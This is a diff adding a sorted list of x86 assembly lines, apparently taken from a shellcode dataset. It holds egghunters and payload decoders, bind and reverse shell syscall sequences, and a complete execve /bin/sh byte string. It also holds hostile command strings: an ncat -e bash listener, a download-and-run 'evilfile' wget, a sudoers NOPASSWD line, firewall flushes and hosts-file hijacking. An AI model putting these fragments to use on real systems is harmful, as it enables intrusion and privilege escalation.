@@ -1,0 +1,3105 @@
+_appendfile:
+_build:
+_child:
+_close:
+_cmd:
+_continue:
+_dup2_loop:
+_exec:
+_execline:
+_exit:
+_ip equ 0x0100007f
+_isegg:
+_load_data:
+_next:
+_params:
+_parent_read:
+_parent:
+_random:
+_return:
+_setsockopt:
+_shell:
+_socket:
+_start:
+_user:
+_while_loop:
+_write:
+1:
+1:
+2:
+2:
+3:
+3:
+a_letter db 'd'
+add [ebp-4], esi
+add ah, bh
+add al, 0x25
+add al, 0x3
+add al, 0x33
+add al, 0x66
+add al, 0xa
+add al, 0xb
+add al, byte '0'
+add al, byte [edi]
+add ax, [di + 20]
+add ax, 01
+add bl, 0x2
+add bx, ax
+add byte [edi], 0x4 \n not byte [edi]
+add byte [edi], 7 \n not byte [edi]
+add byte [edi], 8 \n not byte [edi]
+add byte [esi], 0x1 \n not byte [esi]
+add byte [esi], 0x1 \n not byte [esi]
+add byte [esi], 0x9 \n not byte [esi]
+add byte [esi], 2 \n not byte [esi]
+add byte [esi], 3 \n not byte [esi]
+add byte [var], 10
+add byte [var], 20
+add byte_value, 65
+add byte_value, dl
+add cl, 0x2
+add cl, 0xb8
+add dx, 0x1b
+add dx, 0x2f2f
+add eax, [ebp-4]
+add eax, 0x10
+add eax, 0x12345678
+add eax, 0x2d383638
+add eax, 0x31179798
+add eax, 0x5 \n jnz L2
+add eax, 0x7 \n jnz L4
+add eax, 1 \n jnz L1
+add eax, 10
+add eax, 10
+add eax, 16
+add eax, 2
+add eax, 2
+add eax, 2
+add eax, 24
+add eax, 4
+add eax, 40000h
+add eax, 48
+add eax, 9 \n jnz decode
+add eax, c
+add eax, ebx
+add eax, ebx
+add eax, edx
+add eax, edx
+add eax, edx
+add eax, esi
+add eax, esi
+add ebp, 0x2
+add ebx, 16
+add ebx, 2
+add ebx, 2
+add ebx, 24
+add ebx, 3
+add ebx, 5
+add ebx, ecx
+add ecx, 16
+add ecx, ebx
+add edi, edi
+add edi, edi
+add edx, 16
+add edx, 32
+add edx, 48
+add edx, 64
+add edx, eax
+add edx, eax
+add edx, eax
+add edx, ecx
+add esi, 0x21354523
+add esi, 0x21354523
+add esi, 0x30
+add esi, 0x33333333
+add esi, 0x3f3f3f3f
+add esi, 4
+add esi, eax
+add esi, eax
+add esp, 0x20
+add esp, 3
+add esp, 3
+add esp, 4
+add marks, 10
+addr: db 0x1
+all:
+an_integer dd 12425
+and al, 0fh
+and ax, 1
+and eax, 0000000fh
+and eax, 0fh
+and eax, 3f465456
+and eax, 40392b29
+and ebx, 0000000fh
+and ecx, 0000000fh
+and edx, 0000000fh
+and mask1, 128
+arr dd 100
+arr dd 50
+arr1 resb 400
+array dd 20
+array word 20
+array word 5
+b: dd 0x0
+big_number dd 123456789
+bignum: resw 1
+buffer: resb 64
+buffersize: dw 1024
+byte_table db 14, 15, 22, 45
+byte_value db 150
+bytes db 10
+bytes db 20
+call _appendfile
+call _build
+call _continue
+call _continue
+call _exec
+call _exit
+call _malloc
+call _params
+call _printf
+call _write
+call [esp]
+call atoi
+call code
+call doit
+call egghunter
+call esi
+call esi
+call esp
+call execute
+call internetreadfile
+call iprint
+call iprintlf
+call jmp_search
+call jmp_search
+call loader
+call main
+call me
+call my_subroutine
+call near stageaddress
+call one
+call prepare
+call quit
+call set_argv
+call shell_ret
+call shellcode
+call sprint
+call sprintlf
+call start
+call strlen
+call two
+call write
+call writestring
+call_decoded:
+call_decoder:
+call_egghunter:
+call_shellcode:
+call_shellcode:
+callit:
+callme:
+callpop:
+callpop:
+cdq
+cdq
+cdq
+cdq
+check_even_odd:
+child:
+chmod_call equ 15
+choice db 'y'
+cld
+cld
+cld
+close_syscall equ 6
+closefile:
+closefile:
+cmd:
+cmd: db 'cat /etc/passwd'
+cmd: db 'cat /etc/passwd'
+cmp [ebp+arg_0], 1
+cmp [ebp+var_a], 0
+cmp [ebp+var_a], 0
+cmp [ebp+var_a], 0 \n jnz short loc_4010E5
+cmp [ebp+var_a], 0 \n jnz short loc_4010E5
+cmp [esi], edx
+cmp [esi], edx
+cmp al, 0x38 \n je 0x40 \n push byte 0x1
+cmp al, 0x38 \n je 0x40 \n push byte 0x1
+cmp al, 0xaa \n je decode_insertion \n xor al, bl
+cmp al, 0xaa \n je decode_insertion \n xor al, bl
+cmp al, 0xf2
+cmp al, 0xf2
+cmp al, 0xf2
+cmp al, 0xf2 \n je _start
+cmp al, 0xf2 \n je _start
+cmp al, 0xf2 \n je _start \n mov eax, 0x50905090
+cmp al, 0xf2 \n je _start \n mov eax, 0x50905090
+cmp al, 0xf2 \n je fillOnes
+cmp al, 0xf2 \n je fillOnes
+cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193
+cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193
+cmp al, 0xf2 \n je next_page
+cmp al, 0xf2 \n je next_page
+cmp al, 0xf2 \n jz _start
+cmp al, 0xf2 \n jz _start
+cmp al, 0xf2 \n jz incpage
+cmp al, 0xf2 \n jz incpage
+cmp al, 9 \n jg l1
+cmp al, 9 \n jg l1
+cmp al, 9 \n jge l1
+cmp al, 9 \n jge l1
+cmp al, bl \n ja l2 \n add eax, 3
+cmp al, bl \n ja l2 \n add eax, 3
+cmp al, bl \n jb l2
+cmp al, bl \n jb l2
+cmp al, cl
+cmp al, cl
+cmp al, cl \n jne short decode \n jmp shellcode
+cmp ax, bx \n jne l3
+cmp ax, bx \n jne l3 \n jmp while
+cmp ax, bx \n jne l3 \n jmp while
+cmp bh, al
+cmp bl, 0x1f
+cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40
+cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40
+cmp bl, 0xaa \n je shellcode
+cmp bl, 0xbb \n je xordecode \n jmp notdecode
+cmp bl, 48
+cmp bl, 57
+cmp bl, 78h \n jg short loc_402B1D
+cmp bl, 78h \n jg short loc_402B1D
+cmp bl, 78h \n jge short loc_402B1D
+cmp bl, 78h \n jge short loc_402B1D
+cmp bl, 78h \n jl short loc_402B1D
+cmp bl, 78h \n jl short loc_402B1D
+cmp bl, 78h \n jle short loc_402B1D
+cmp bl, 78h \n jle short loc_402B1D
+cmp bl, al \n je loop_2
+cmp bl, al \n je loop_2
+cmp bl, al \n je loop_2 \n jmp short not_found
+cmp bl, al \n je loop_2 \n jmp short not_found
+cmp byte [buff], 61h
+cmp byte [buff], 7ah
+cmp byte [eax], 0
+cmp byte [ebp+ecx], 61h
+cmp byte [ebp+ecx], 7ah
+cmp BYTE [edx], 0x2e \n jne l2
+cmp BYTE [edx], 0x2e \n jne l2
+cmp BYTE [edx], 0x2e \n jne l2 \n jmp while
+cmp BYTE [edx], 0x2e \n jne l2 \n jmp while
+cmp byte [esi], 0x7
+cmp BYTE [esi], 0x7 \n jl lowbound
+cmp BYTE [esi], 0x7 \n jl lowbound
+cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7
+cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7
+cmp BYTE [esi], 0x7 \n jle lowbound
+cmp byte [esi], 0xd
+cmp byte [esi], 0xD \n jl wrap_around
+cmp byte [esi], 0xD \n jl wrap_around
+cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD
+cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD
+cmp byte [esi], 0xD \n jle wrap_around
+cmp BYTE al, 2 \n je do_inject
+cmp BYTE al, 2 \n je do_inject
+cmp BYTE al, 2 \n je do_inject \n jmp while
+cmp BYTE al, 2 \n je do_inject \n jmp while
+cmp BYTE bl, [esi] \n jne loop_1
+cmp cl, 0x11 \n jb 0xff \n add dl, 0x5
+cmp cl, 0x11 \n jb 0xff \n add dl, 0x5
+cmp cl, 0x3 \n jne loop
+cmp cl, 0x3 \n jne loop
+cmp cl, 0x3 \n jne loop2
+cmp cl, 0x3 \n jne loop2
+cmp cl, 12 \n jg l2
+cmp cl, 12 \n jg l2
+cmp cl, 12 \n jge l2
+cmp cl, 12 \n jge l2
+cmp cl, dl \n jb l3
+cmp cl, dl \n jb l3
+cmp cl, dl \n je EncodedShellcode
+cmp cl, dl \n je EncodedShellcode
+cmp cl, dl \n je init \n inc cl
+cmp cl, dl \n je init \n inc cl
+cmp dl, 1 \n je exit \n jmp reading
+cmp dl, 1 \n je exit \n jmp reading
+cmp dl, 1h
+cmp dl, 27 \n jg l3
+cmp dl, 27 \n jg l3
+cmp dl, 27 \n jge l3
+cmp dl, 27 \n jge l3
+cmp dl, cl \n jb l1 \n mov al, 0x39
+cmp dl, cl \n jb l1 \n mov al, 0x39
+cmp dword [eax-4], egg1
+cmp dword [eax-4], egg1 \n jne _next \n jmp eax
+cmp dword [eax-4], egg1 \n jne _next \n jmp eax
+cmp dword [eax-4], egg2 \n je _next \n jmp eax
+cmp dword [eax-4], egg2 \n je _next \n jmp eax
+cmp dword [eax-4],egg1
+cmp dword [eax-8], egg
+cmp dword [eax-8], egg \n jne _next
+cmp dword [eax-8], egg \n jne _next
+cmp dword [eax-8],egg
+cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax
+cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax
+cmp dword [eax], ebx
+cmp dword [eax], ebx \n jne next_addr \n jmp eax
+cmp dword [eax], ebx \n jne next_addr \n jmp eax
+cmp DWORD [eax], edx \n jne loop \n jmp eax
+cmp DWORD [eax], edx \n jne loop \n jmp eax
+cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax
+cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax
+cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax
+cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax
+cmp DWORD [edx], 0x636f7270 \n je while
+cmp dword [var], 10
+cmp dx, 00
+cmp dx, 0x03e8 \n je L1
+cmp dx, 0x03e8 \n je L1
+cmp eax, 0
+cmp eax, 0
+cmp eax, 0
+cmp eax, eax
+cmp eax, eax \n jne 0x8
+cmp eax, eax \n jne 0x8
+cmp eax, eax \n jne 0x8 \n xor eax, eax
+cmp eax, eax \n jne 0x8 \n xor eax, eax
+cmp eax, ebp \n jnz short loc_40102B
+cmp eax, ebp \n jnz short loc_40102B
+cmp eax, ebx
+cmp eax, ebx
+cmp eax, ebx
+cmp eax, ebx \n je 0x47
+cmp eax, ebx \n je 0x47
+cmp eax, ebx \n je 0x47 \n xor ecx, ecx
+cmp eax, ebx \n je 0x47 \n xor ecx, ecx
+cmp eax, ebx \n je all
+cmp eax, ebx \n je all
+cmp eax, ebx \n je all \n xor eax, eax
+cmp eax, ebx \n je all \n xor eax, eax
+cmp eax, ebx \n je child
+cmp eax, ebx \n je child
+cmp eax, ebx \n je connect \n ja exit
+cmp eax, ebx \n je connect \n ja exit
+cmp eax, ebx \n je download
+cmp eax, ebx \n je download
+cmp eax, ebx \n je exit
+cmp eax, ebx \n je exit
+cmp eax, ebx \n je exit \n add al, 0x3
+cmp eax, ebx \n je exit \n add al, 0x3
+cmp eax, ebx \n je exit \n mov al, 0x4
+cmp eax, ebx \n je exit \n mov al, 0x4
+cmp eax, ebx \n je L1
+cmp eax, ebx \n je L1
+cmp eax, ebx \n jne retry
+cmp eax, ebx \n jne retry
+cmp eax, edi \n jne infinite
+cmp eax, edi \n jne infinite
+cmp eax, edi \n jne infinite \n xor eax, eax
+cmp eax, edi \n jne infinite \n xor eax, eax
+cmp eax,ebx
+cmp ebp, 0
+cmp ebx, 0
+cmp ebx, 9 \n ja exit \n jmp loop
+cmp ebx, 9 \n ja exit \n jmp loop
+cmp ecx, 0
+cmp ecx, 0
+cmp ecx, 0h
+cmp ecx, 10
+cmp ecx, 100
+cmp ecx, 100
+cmp ecx, 5
+cmp ecx, ebp
+cmp ecx, ebp
+cmp ecx, edx \n ja l1
+cmp ecx, edx \n ja l1
+cmp edi, 0
+cmp edx, 0
+cmp edx, 0x43 \n ja loop \n push edx
+cmp edx, 0x43 \n ja loop \n push edx
+cmp edx, 10
+cmp edx, 42
+cmp edx, 42 \n je short loc_402B13
+cmp edx, 42 \n je short loc_402B13
+cmp edx, ebx
+cmp edx, ebx \n je 0x8 \n
+cmp edx, ebx \n je 0x8 \n
+cmp edx, ebx \n je 0x8 \n mov ebx, edx
+cmp edx, ebx \n je 0x8 \n mov ebx, edx
+cmp esi, 10
+cmp esi, edx \n je find_egg
+cmp word [ecx], 0x5951
+code:
+connect:
+cont:
+contents db 'hello world!', 0h
+createfile:
+createfile:
+cycle:
+D1: \n mov cl, byte [esi]
+D1: \n mov dl, byte [esi]
+D1: \n pop esi \n mov edi, esi
+D2: \n not byte [esi]
+D2: \n not byte [esi]
+D2: \n pop esi \n mov edi, esi
+D3: \n add byte [esi], 5
+D3: \n pop esi \n mov edi, esi
+D4: \n xor byte [esi], 0x1
+D4: \n xor byte [esi], 0x12
+data:
+db ',ajm,pk#########'
+db '/bin/sh'
+db '/bin/sh'
+db '/bin/sh#sh#'
+db '/etc/passwd#'
+db '/proc/sys/kernel/randomize_va_spacex'
+db '/sbin/insmod#/tmp/o.o'
+db '/sbin/ipchains#-f#'
+db '/sbin/iptables#-f#'
+db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
+db '0',10
+db 'all all=(all) nopasswd: all', 0xa
+db 'cp /bin/sh /tmp/sh'
+db 'egg mark'
+db 'egg mark'
+db 'my.txtx'
+db 'rm -f /tmp/f'
+db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
+db 0x68
+db 0x68
+db 0x80
+db 0x80
+db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
+db 0xcd
+db 0xcd
+db 10
+db 10
+dd 0xdeadbeef
+dec bl \n jnz L1
+dec byte dl
+dec byte dl
+dec cl
+dec cl
+dec cl
+dec cl \n jns dup2
+dec cl \n jns loopinghere
+dec cl \n jnz L2
+dec cl \n jz L2
+dec dl
+dec eax
+dec eax
+dec eax
+dec eax
+dec ebp
+dec ebx
+dec ebx
+dec ecx
+dec ecx
+dec ecx
+dec ecx \n jns _dup2_loop
+dec ecx \n jns 2f_loop
+dec ecx \n jns dup2
+dec ecx \n jns dup2loop
+dec ecx \n jns dup2loop
+dec ecx \n jns duploop
+dec ecx \n jns loop
+dec ecx \n jns loop2
+dec ecx \n jz counter_is_now_zero
+dec edx
+dec edx
+dec esp
+decode:
+decoder:
+decoder:
+decoder:
+dim: equ 25
+dim: equ 512
+div dword [value]
+div dword [var]
+div ebx
+div ebx
+div ecx
+div edx
+div esi
+do_dup:
+do_dup:
+doit:
+done:
+download:
+download:
+dup2:
+dup2:
+dup2loop:
+duploop:
+duploop:
+egg equ 'egg '
+egg1 equ 'mark'
+egghunter:
+end:
+entrypoint:
+even_number:
+execfile:
+exit_call equ 1
+exit_on_error:
+exit:
+exit:
+exit:
+F2: \n call function_1
+F2: \n cmp byte [esi], 0x2 \n jg L1 \n add byte [esi], 0x2 \n jmp L2
+F2: \n inc esi
+F2: \n inc esi \n inc esi
+F2: \n jmp L3
+F2: \n not bl \n inc bl
+F2: \n not bl \n inc bl
+F2: \n not bl \n inc bl
+F2: inc eax \n jmp L1
+F3: \n call function_1
+F3: \n cmp byte [esi], 0x3 \n je L1 \n mov byte [esi], 0x3 \n jmp L2
+F3: \n inc edi
+F3: \n inc edi \n edi
+F3: \n jmp L5
+F3: \n not al \n inc al
+F3: \n not al \n inc al
+F3: \n not al \n inc al
+F3: inc ebx \n jmp short L2
+F4: \n call function_1
+F4: \n cmp byte [esi], 0x1 \n jl L1 \n sub byte [esi], 0x1 \n jmp L2
+F4: \n jmp short L5
+F4: \n not dl \n inc dl
+F4: \n not dl \n inc dl
+F4: inc ecx \n jmp L2
+F5: \n call function_1
+F5: \n cmp byte [esi], 0x2 \n jg L1 \n add byte [esi], 0x2 \n jmp L2
+F5: \n jmp L1
+F5: inc edx \n jmp short L3
+F6: \n cmp byte [esi], 0x3 \n je L1 \n mov byte [esi], 0x3 \n jmp L2
+file: db '/sbin/iptables#-f'
+fileaddress:
+filecontents: resb 128
+filename: db 'readme.txt', 0h
+filename: resb 255
+fill:
+fill:
+find_egg:
+find_egg:
+format:
+formatting:
+function_1: \n call [esp]
+function_2: \n call [esp]
+function_3: \n call [esp]
+function_4: \n call [esp]
+function_5: \n call [esp]
+fupdisasm:
+fupdisasm:
+global _shell
+global _start
+global _start
+global _start
+global _start
+google db '127.1.1.1 google.com'
+google: db '127.1.1.1 google.com'
+gotocall:
+hello: db 'hello world!',10
+hellolen: equ $-hello
+here:
+here:
+inc [count]
+inc al
+inc ax
+inc ax
+inc ax
+inc bl
+inc bx
+inc bx
+inc byte [esp+ecx]
+inc cl
+inc count
+inc dl
+inc dl
+inc dl
+inc dword [tmp]
+inc dword [value]
+inc dword [var]
+inc eax
+inc eax \n inc eax \n inc eax \n inc eax
+inc eax \n inc eax \n inc eax \n inc eax
+inc ebx
+inc ebx
+inc ebx
+inc ebx
+inc ebx \n inc ebx
+inc ebx \n inc ebx
+inc ebx \n inc ebx \n inc ebx \n inc ebx
+inc ebx \n inc ebx \n inc ebx \n inc ebx
+inc ecx
+inc ecx
+inc ecx \n inc ecx
+inc ecx \n inc ecx \n inc ecx \n inc ecx
+inc ecx \n inc ecx \n inc ecx \n inc ecx
+inc edi
+inc edx
+inc edx \n inc edx
+inc esi
+inc esi \n inc esi
+inc esi \n inc esi
+inc esi \n inc esi
+inc esi \n jmp L1
+inc esi \n jmp short L2
+inc esp
+incaddr:
+incpage:
+init:
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 0x80
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+int 80h
+ja exi
+ja exit
+ja next
+ja write
+jb 0xf3
+jb modtest
+jb next
+jb write
+jbe done
+je all
+je connec
+je connect
+je continue
+je continue
+je done
+je even_number
+je exit
+je exit
+je l7
+je short encodedshellcode
+je short loc_402b13
+je stop
+jeq loop
+jg finished
+jl _while_loop
+jl _while_loop
+jl finished
+jl wrap_around
+jle lp1
+jmp _accept
+jmp _read
+jmp _return
+jmp _star
+jmp _start
+jmp _while_loop
+jmp aslr_file
+jmp begin
+jmp call_egghunter
+jmp callpop
+jmp callpop
+jmp callz
+jmp carryon
+jmp connec
+jmp eax
+jmp eax
+jmp ecx
+jmp edi
+jmp edi
+jmp edx
+jmp encrypt
+jmp entrypoint
+jmp esp
+jmp fupdisasm+1
+jmp fupdisasm+1
+jmp fupdisasm+3
+jmp jocker
+jmp l20
+jmp loop
+jmp multiplyloop
+jmp nextarg
+jmp nextchar
+jmp one
+jmp read
+jmp read
+jmp read
+jmp reading
+jmp shell
+jmp shellcode
+jmp shellcode
+jmp short _cmd
+jmp short _execline
+jmp short _file
+jmp short _load_data
+jmp short _load_data
+jmp short _star
+jmp short _start
+jmp short .exit
+jmp short 0x11
+jmp short 0x2c
+jmp short 0x34
+jmp short 0x63
+jmp short call_decoder
+jmp short call_shellcode
+jmp short callit
+jmp short callme
+jmp short cmd
+jmp short cycle
+jmp short cycle
+jmp short decode
+jmp short decode
+jmp short decode_pr
+jmp short end
+jmp short exi
+jmp short fileaddress
+jmp short formatting
+jmp short four
+jmp short gotocall
+jmp short here
+jmp short inc_dec
+jmp short path
+jmp short process_shellcode
+jmp short push_cmd
+jmp short push_cmd
+jmp short read
+jmp short rotate
+jmp short search
+jmp short setup
+jmp short shellcode
+jmp short stage
+jmp short stage
+jmp short todo
+jmp short two
+jmp two
+jmp_search:
+jnc 0xd8
+jne _nex
+jne _next
+jne 804809a
+jne 80480aa
+jne checkbuzz
+jne checkint
+jne loop
+jne next_addr
+jne nextnumber
+jne no_error
+jne retry
+jne short _while_loop
+jne short _while_loop
+jns _dup2_loop
+jns 2f
+jns 3f
+jns decode_pr
+jns dup2
+jns dup2
+jns duploop
+jns duploop
+jns loop
+jns loopinghere
+jnz _start
+jnz 0x41
+jnz 0x8
+jnz 1
+jnz 1
+jnz decode
+jnz exeunt
+jnz exit_on_error
+jnz incaddr
+jnz incaddr
+jnz l00p
+jnz loop
+jnz loop
+jnz next_addr
+jnz next_cycle
+jnz next_cycle
+jnz scan
+jnz short _paren
+jnz short _parent
+jnz short decode
+jnz short decode
+jnz short loc_4010e5
+jnz stage
+jnz top
+jocker:
+js error
+jz _close
+jz _read
+jz _start
+jz 0x8
+jz call_decoded
+jz child
+jz child
+jz child
+jz child
+jz decoded_shellcode
+jz download
+jz download
+jz encoded
+jz exit
+jz find_egg
+jz find_egg
+jz finished
+jz formatting
+jz formatting
+jz incpage
+jz next_cycle
+jz next_cycle
+jz next_page
+jz nomoreargs
+jz shift_decode
+jz shift_decode
+jz short loc_402b13
+key equ 0xdeadbeef
+l00p:
+L1: \n call [esp]
+L1: \n jmp short esp
+L1: \n jmp short L2
+L2: \n call [esp]
+L2: \n jmp short esi
+L2: \n jmp L3
+L3: \n call [esp]
+L3: \n jmp edi
+L3: \n jmp short L4
+L4: \n jmp short esp
+L5: \n call [esp]
+L5: \n jmp esp
+lea bx, [bp+0x08]
+lea bx, [bp+0x0b]
+lea cx, [bp+di+0x32]
+lea dx, [bp+di+0x3e]
+lea eax, [ebx+0xf]
+lea eax, [ebx+17h]
+lea eax, [ebx+8]
+lea eax, [ecx+0bh]
+lea eax, [ecx+4]
+lea eax, [esi]
+lea eax, [esi+1]
+lea eax, [val]
+lea eax, [var]
+lea eax, [var]
+lea eax, [zero_reg+3]
+lea eax, [zero_reg+3]
+lea eax, [zero_reg+6]
+lea eax, [zero_reg+6]
+lea eax, [zero_reg+66h]
+lea eax, [zero_reg+66h]
+lea eax,[ebx+0xb]
+lea ebp,[ebp+0x59]
+lea ebx, [ebp-8]
+lea ebx, [ebp-8]
+lea ebx, [ebp+24]
+lea ebx, [ebp+24]
+lea ebx, [ebp+39]
+lea ebx, [ebp+39]
+lea ebx, [edx+0x4]
+lea ebx, [esi]
+lea ebx, [esi]
+lea ebx, [esi+1]
+lea ebx, [esi+13]
+lea ebx, [esi+14]
+lea ebx, [esi+15]
+lea ebx, [esi+15]
+lea ebx, [esi+23]
+lea ebx, [esp +1]
+lea ebx, [esp +1]
+lea ebx, [esp]
+lea ebx, [esp]
+lea ebx, [zero_reg+3]
+lea ebx, [zero_reg+3]
+lea ecx, [eax]
+lea ecx, [ebp+28]
+lea ecx, [ebp+28]
+lea ecx, [ebx+0xff]
+lea ecx, [ebx+8]
+lea ecx, [esi + 8]
+lea ecx, [esi]
+lea ecx, [esi+1]
+lea ecx, [esi+18]
+lea ecx, [esi+18]
+lea ecx, [esi+22]
+lea ecx, [esi+35]
+lea ecx, [esi+8]
+lea ecx, [esp]
+lea ecx, [zero_reg+117]
+lea ecx, [zero_reg+117]
+lea ecx, [zero_reg+3]
+lea ecx, [zero_reg+3]
+lea edi, [ebx]
+lea edi, [ebx]
+lea edi, [ebx+4*esi]
+lea edi, [esi +1]
+lea edi, [esi+13]
+lea edx, [ebx+12]
+lea edx, [esi + 12]
+lea edx, [esi]
+lea edx, [esi+1]
+lea edx, [esi+26]
+lea edx, [esi+26]
+lea edx, [esi+30]
+lea edx, [esi+47]
+lea esi, [ebp+20]
+lea esi, [ebp+20]
+lea esi, [esi +4]
+lea esp, [ebx]
+len equ $ - msg
+len equ $-encodedshellcode
+len: equ $-google
+len: equ $-shellcode
+letter_c db 'c'
+line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
+loader:
+loop .3
+loop 3
+loop bucle
+loop check_even_odd
+loop check_even_odd \n jmp short shellcode
+loop decrypt \n jmp encrypt
+loop do_dup
+loop do_dup
+loop do_dup \n push byte 0x3f
+loop fill
+loop fill
+loop fill \n mov ecx, esp
+loop l1 \n mov eax, esp
+loop l1 \n mov eax, esp
+loop l2 \n jmp edi
+loop l2 \n mov ebx, esp
+loop l2 \n mov ebx, esp
+loop l3 \n mov ecx, esp
+loop l3 \n mov ecx, esp
+loop l4 \n mov edx, esp
+loop l4 \n mov edx, esp
+loop main_inc
+loop main_inc \n mov ebx, esp
+loop main_inc \n mov ebx, esp
+loop main_loop
+loop main_push
+loop main_push \n mov cl, 30
+loop ROT_decode \n jmp short Shellcode
+loop up
+loop:
+loop:
+loopinghere:
+loopnz decode
+loopnz L1
+loopnz L1 \n jmp shellcode
+loopnz L2
+loopnz L2 \n push eax
+loopnz L3 \n mov edx, 7
+loopnz Label1
+loopnz next
+loopnz next \n jmp ecx
+loopnz next2 \n jmp edi
+main_inc:
+main_loop:
+main_push:
+main_push:
+main:
+main:
+marks dw 0, 0, 0, 0
+matrix qw 12*10
+me:
+me:
+message db '/bin/sh'
+message db '/bin/sh'
+message db '/etc/passwd'
+message db '/etc/passwd'
+message db 'hello',13,0
+message: db 'hello world!'
+message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
+mov [1000h], ax
+mov [bp+0x07], al
+mov [bp+0x0a], al
+mov [bp+0x31], al
+mov [bp+0x32], si
+mov [bp+0x36], bx
+mov [bp+0x3a], bx
+mov [bp+0x3e], ax
+mov [ebp-4], edi
+mov [ebp+12], ecx
+mov [ebp+12], ecx
+mov [ebp+20], zero_reg
+mov [ebp+20], zero_reg
+mov [ebp+22], word ax
+mov [ebp+22], word ax
+mov [ebp+var_a], eax
+mov [ebx + 6], dl
+mov [ebx], 110
+mov [ebx], 123
+mov [ebx+0xe], dl
+mov [ebx+12], eax
+mov [ebx+7], al
+mov [ebx+8], ebx
+mov [ecx], 25
+mov [ecx+4], eax
+mov [edi], al
+mov [esi+22], al
+mov [esi+34], al
+mov [esi+35], esi
+mov [esi+39], ebx
+mov [esi+43], ebx
+mov [esi+47], eax
+mov [esi+eax], cl
+mov [esp + 1], cl
+mov [esp+4], esp
+mov [esp+57], al
+mov [esp+58], ah
+mov [esp+59], ebx
+mov [var], ebx
+mov [var1], eax
+mov a_letter, al
+mov ah, 0x80
+mov al, [byte_tbl+2]
+mov al, [esi]
+mov al, 03h
+mov al, 04h
+mov al, 05h
+mov al, 0x01
+mov al, 0x01
+mov al, 0x04
+mov al, 0x05
+mov al, 0x06
+mov al, 0x0a
+mov al, 0x0b
+mov al, 0x1
+mov al, 0x1
+mov al, 0x17
+mov al, 0x1f
+mov al, 0x2
+mov al, 0x21
+mov al, 0x2e
+mov al, 0x3
+mov al, 0x30
+mov al, 0x33
+mov al, 0x3f
+mov al, 0x3f
+mov al, 0x4
+mov al, 0x4
+mov al, 0x42
+mov al, 0x46
+mov al, 0x5
+mov al, 0x5
+mov al, 0x58
+mov al, 0x6
+mov al, 0x66
+mov al, 0x66
+mov al, 0x66
+mov al, 0x66
+mov al, 0x66
+mov al, 0x7
+mov al, 0x8
+mov al, 0xa2
+mov al, 0xb
+mov al, 0xb
+mov al, 0xb
+mov al, 0xb5
+mov al, 0xcd
+mov al, 0xf
+mov al, 1
+mov al, 1
+mov al, 10
+mov al, 102
+mov al, 11
+mov al, 11
+mov al, 12
+mov al, 15
+mov al, 16
+mov al, 2
+mov al, 20
+mov al, 23
+mov al, 37
+mov al, 39
+mov al, 4
+mov al, 4
+mov al, 5
+mov al, 5 \n dec al \n jnz l2
+mov al, 54
+mov al, 6
+mov al, 61
+mov al, 63
+mov al, 66h
+mov al, 70
+mov al, 72h
+mov al, 99
+mov al, a_letter
+mov al, byte [digits+eax]
+mov al, byte [edi]
+mov al, byte [edx+ecx]
+mov al, byte 0bh
+mov al, byte 0bh
+mov al, byte 0x1
+mov al, byte 2ah
+mov al, byte 2ah
+mov al, byte 2h
+mov al, byte 2h
+mov al, byte 3fh
+mov al, byte 3fh
+mov al, byte 3h
+mov al, byte 3h
+mov al, byte 66h
+mov al, byte 66h
+mov al, byte 6h
+mov al, byte 6h
+mov al, byte[buff+ecx]
+mov al, close_syscall
+mov al, write_syscall
+mov ax, [1000h]
+mov ax, [di]
+mov ax, [esi]
+mov ax, [my_var]
+mov ax, 00
+mov ax, 010ch
+mov ax, 0x167
+mov ax, 0x169
+mov ax, 0x16a
+mov ax, 0x16b
+mov ax, 0x16c
+mov ax, 1
+mov ax, 102
+mov ax, 1666
+mov ax, 45h
+mov ax, 8h
+mov ax, 9
+mov ax, bx
+mov ax, bx
+mov bl, 0x01
+mov bl, 0x02
+mov bl, 0x04
+mov bl, 0x1
+mov bl, 0x1
+mov bl, 0x14
+mov bl, 0x2
+mov bl, 0x2
+mov bl, 0x3
+mov bl, 0x4
+mov bl, 0x4
+mov bl, 0x5
+mov bl, 0x5
+mov bl, 0x7
+mov bl, 0x8
+mov bl, 0x9
+mov bl, 0xe
+mov bl, 10
+mov bl, 2
+mov bl, 3
+mov bl, 3 \n dec bl \n jnz l3
+mov bl, 4
+mov bl, 5
+mov bl, al \n sub bl, 2 \n jnz loop
+mov bl, byte [digits+ebx]
+mov bl, byte [eax]
+mov bl, byte 0eh
+mov bl, cl
+mov bx, [esi]
+mov bx, 1666
+mov bx, 18
+mov bx, 20
+mov bx, word_value
+mov byte [eax], dl
+mov byte [ebx], 2
+mov byte [ecx], 2
+mov byte [ecx+92], dl
+mov byte [ecx+92], dl
+mov byte [edi], bl
+mov byte [edx+ecx],al
